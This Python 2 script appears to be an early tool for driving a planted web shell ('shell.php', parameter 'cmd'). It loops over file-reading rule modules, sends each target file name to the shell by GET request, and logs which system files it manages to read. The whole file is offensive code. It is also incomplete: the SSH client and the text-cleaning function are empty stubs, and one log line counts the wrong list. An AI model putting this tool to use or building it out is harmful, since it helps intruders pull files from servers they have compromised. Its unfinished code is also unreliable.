# coding: utf-8
import requests
from urllib import quote

from core import load_script
from log import log

def main():
    url = 'http://localhost/shell.php'
    key = 'cmd'
    # 这里是判断是否读取成功的format格式

    log.info('[Init] Use Web Shell Module')
    log.info('[Init] url: ' + url)
    log.info('[Init] key: ' + key)

    file_list = load_script.load()
    # file_list = [class, ]
    # cmd_list = [class, ]

    log.info('[Load] File Rules [{}]'.format(len(file_list)))
    log.info('[Load] Cmd Rules [{}]'.format(len(file_list)))

    # 如果是读文件
    for op in file_list:
        mod = op()
        file_name = mod.core
        text = web_request(url, key, file_name)
        text = clean_text(text)
        try:
            result = mod.analysis(text)
            if result != False:
                log.info('[access] {}'.format(mod.core))
        except Exception as e:
            log.error(e)
    
    log.info('[Fin] Have a nice day!')

# clean the text and get what we want.
def clean_text(text):
    common_text = 'balabala'
    return text

def web_request(url, key, filename):
    try:
        a = requests.get(url+'?'+key+'='+quote(filename), timeout=3).content
        return a
    except Exception as e:
        log.error(e)
        return ''

def ssh_client():
    pass

if __name__ == "__main__":
    main()
